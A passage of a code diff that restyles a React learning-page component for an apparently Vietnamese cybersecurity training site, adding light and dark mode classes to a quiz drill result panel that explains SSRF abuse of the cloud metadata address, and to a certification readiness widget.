-                        : "bg-slate-950 hover:bg-slate-850 border-slate-800 text-slate-300 hover:border-cyan-500/40"
+                          ? "bg-rose-50 dark:bg-rose-950/40 border-rose-500 text-rose-800 dark:text-rose-200"
+                          : "bg-slate-50 dark:bg-slate-950/40 border-slate-200 dark:border-slate-850 text-slate-400 opacity-60"
+                        : "bg-slate-50 hover:bg-slate-100 dark:bg-slate-950 dark:hover:bg-slate-850 border-slate-200 dark:border-slate-800 text-slate-700 dark:text-slate-300 hover:border-blue-400 dark:hover:border-cyan-500/40"
                     }`}
                   >
-                    <span className="font-mono text-[10px] font-bold px-1.5 py-0.5 rounded bg-slate-900 border border-slate-700 text-slate-400 shrink-0">
+                    <span className="font-mono text-[10px] font-bold px-1.5 py-0.5 rounded bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 text-slate-600 dark:text-slate-400 shrink-0">
                       {String.fromCharCode(65 + idx)}
                     </span>
                     <span className="flex-1 leading-snug">{opt.label}</span>
@@ -553,26 +681,26 @@ export function Learning() {
 
             {/* Drill Result Explanation */}
             {drillSubmitted && (
-              <div className="mt-3 p-3.5 rounded-xl bg-slate-950 border border-cyan-500/30 text-xs space-y-2 animate-fade-in-up">
+              <div className="mt-3 p-3.5 rounded-xl bg-slate-50 dark:bg-slate-950 border border-blue-200 dark:border-cyan-500/30 text-xs space-y-2 animate-fade-in-up">
                 <div className="flex items-center gap-1.5 font-bold font-mono">
                   {drillAnswer === 0 ? (
                     <>
-                      <Check className="h-4 w-4 text-emerald-400 shrink-0" />
-                      <span className="text-emerald-400">Chính xác! +150 XP đã cộng vào hồ sơ</span>
+                      <Check className="h-4 w-4 text-emerald-600 dark:text-emerald-400 shrink-0" />
+                      <span className="text-emerald-600 dark:text-emerald-400">Chính xác! +150 XP đã cộng vào hồ sơ</span>
                     </>
                   ) : (
                     <>
-                      <AlertTriangle className="h-4 w-4 text-amber-400 shrink-0" />
-                      <span className="text-amber-400">Phân tích chiến thuật bổ sung</span>
+                      <AlertTriangle className="h-4 w-4 text-amber-600 dark:text-amber-400 shrink-0" />
+                      <span className="text-amber-600 dark:text-amber-400">Phân tích chiến thuật bổ sung</span>
                     </>
                   )}
                 </div>
-                <p className="text-slate-300 text-[11px] leading-relaxed">
-                  Địa chỉ IP <code className="font-mono text-cyan-400 bg-slate-900 px-1 py-0.5 rounded border border-slate-800">169.254.169.254</code> là địa chỉ link-local của AWS/Azure Instance Metadata Service (IMDS). Kẻ tấn công lợi dụng lỗ hổng SSRF để đánh cắp IAM Temporary Session Keys.
+                <p className="text-slate-600 dark:text-slate-300 text-[11px] leading-relaxed">
+                  Địa chỉ IP <code className="font-mono text-blue-600 dark:text-cyan-400 bg-white dark:bg-slate-900 px-1 py-0.5 rounded border border-slate-200 dark:border-slate-800">169.254.169.254</code> là địa chỉ link-local của AWS/Azure Instance Metadata Service (IMDS). Kẻ tấn công lợi dụng lỗ hổng SSRF để đánh cắp IAM Temporary Session Keys.
                 </p>
                 <button
                   onClick={handleDrillReset}
-                  className="inline-flex items-center gap-1 text-[11px] font-bold text-cyan-400 hover:underline pt-1 cursor-pointer font-mono"
+                  className="inline-flex items-center gap-1 text-[11px] font-bold text-blue-600 dark:text-cyan-400 hover:underline pt-1 cursor-pointer font-mono"
                 >
                   <RotateCcw className="h-3 w-3" />
                   <span>Thử lại kịch bản khác</span>
@@ -584,33 +712,33 @@ export function Learning() {
           {/* ====================================================================
               WIDGET 2: INDUSTRY CERTIFICATION ROADMAP MAPPING
              ==================================================================== */}
-          <div className="p-5 rounded-3xl bg-slate-900 border border-slate-800 shadow-xl space-y-4 text-white">
+          <div className="p-5 rounded-3xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-md space-y-4 text-slate-900 dark:text-white">
             <div className="flex items-center gap-2">
-              <Award className="h-4 w-4 text-cyan-400" />
-              <h3 className="text-sm font-bold text-white">
+              <Award className="h-4 w-4 text-blue-600 dark:text-cyan-400" />
+              <h3 className="text-sm font-bold text-slate-900 dark:text-white">
                 Mức Độ Chuẩn Bị Chứng Chỉ Quốc Tế
               </h3>
             </div>
 
-            <p className="text-xs text-slate-400 leading-relaxed font-sans">
+            <p className="text-xs text-slate-500 dark:text-slate-400 leading-relaxed font-sans">
               Các bài học được chuẩn hóa theo format đề thi offensive & defensive thực chiến:
             </p>
 
             <div className="space-y-3">
               {[
-                { name: "CompTIA Security+ (SY0-701)", readiness: 85, color: "bg-cyan-500" },
-                { name: "Certified Ethical Hacker (CEH v12)", readiness: 65, color: "bg-blue-500" },
+                { name: "CompTIA Security+ (SY0-701)", readiness: 85, color: "bg-blue-600 dark:bg-cyan-500" },
+                { name: "Certified Ethical Hacker (CEH v12)", readiness: 65, color: "bg-indigo-600 dark:bg-blue-500" },
                 { name: "OffSec Certified Professional (OSCP)", readiness: 40, color: "bg-amber-500" },
                 { name: "Certified Cloud Security (CCSP)", readiness: 25, color: "bg-indigo-500" },
               ].map((cert, i) => (
                 <div key={i} className="space-y-1">
                   <div className="flex justify-between text-xs font-semibold">
-                    <span className="text-slate-300 truncate max-w-[200px]">{cert.name}</span>
-                    <span className="font-mono text-cyan-400 font-bold">
+                    <span className="text-slate-700 dark:text-slate-300 truncate max-w-[200px]">{cert.name}</span>
+                    <span className="font-mono text-blue-600 dark:text-cyan-400 font-bold">
                       <CountUp end={cert.readiness} suffix="%" />
                     </span>
                   </div>
-                  <div className="h-1.5 w-full bg-slate-950 rounded-full overflow-hidden">
+                  <div className="h-1.5 w-full bg-slate-100 dark:bg-slate-950 rounded-full overflow-hidden">
                     <div
                       className={`h-full ${cert.color} rounded-full transition-all duration-500`}
                       style={{ width: `${cert.readiness}%` }}
@@ -622,7 +750,7 @@ export function Learning() {
 
             <div className="pt-2">
               <Link to="/learning-paths" className="w-full block">
-                <button className="w-full py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono text-xs transition-colors cursor-pointer border border-slate-700">
+                <button className="w-full py-2.5 rounded-xl bg-slate-100 hover:bg-slate-200 dark:bg-slate-800 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 font-mono text-xs transition-colors cursor-pointer border border-slate-200 dark:border-slate-700">
                   Khám Phá Lộ Trình Sự Nghiệp &rarr;
                 </button>
               </Link>
